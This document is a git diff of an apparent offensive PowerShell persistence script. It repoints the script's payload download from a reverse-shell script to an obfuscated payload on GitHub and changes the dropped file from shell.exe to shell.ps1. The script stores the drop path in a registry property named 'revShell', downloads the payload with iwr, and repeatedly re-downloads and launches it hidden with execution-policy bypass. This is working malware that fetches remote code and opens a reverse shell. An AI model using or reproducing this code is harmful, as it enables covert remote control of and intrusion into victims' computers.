@@ -1,6 +1,6 @@
 param( [string]$basePath )
 
-$uri = "https://github.com/Soumyo001/powershell-reverseshell/raw/refs/heads/main/powershell-reverseshell-dns-tls.ps1"
+$uri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/s.ps1"
 $propertyName = "revShell"
 
 $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
@@ -47,7 +47,7 @@ $item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction Sile
 if(-not($item)){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $revShellPath = $paths[$idx]
-    $revShellPath = "$revShellPath\shell.exe"
+    $revShellPath = "$revShellPath\shell.ps1"
     New-ItemProperty -Path "$basePath" -Name $propertyName -Value $revShellPath -Force | Out-Null
     iwr -Uri $uri -OutFile $revShellPath
 }else { $revShellPath = $item.$propertyName }
@@ -124,7 +124,7 @@ while ($true) {
 
     if(-not(Test-Path $revShellPath -PathType Leaf)){
         $revShellPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-        $revShellPath = "$revShellPath\shell.exe"
+        $revShellPath = "$revShellPath\shell.ps1"
         iwr -Uri $uri -OutFile $revShellPath
         $shellTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$revShellPath'"
         Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $revShellPath -Force | Out-Null
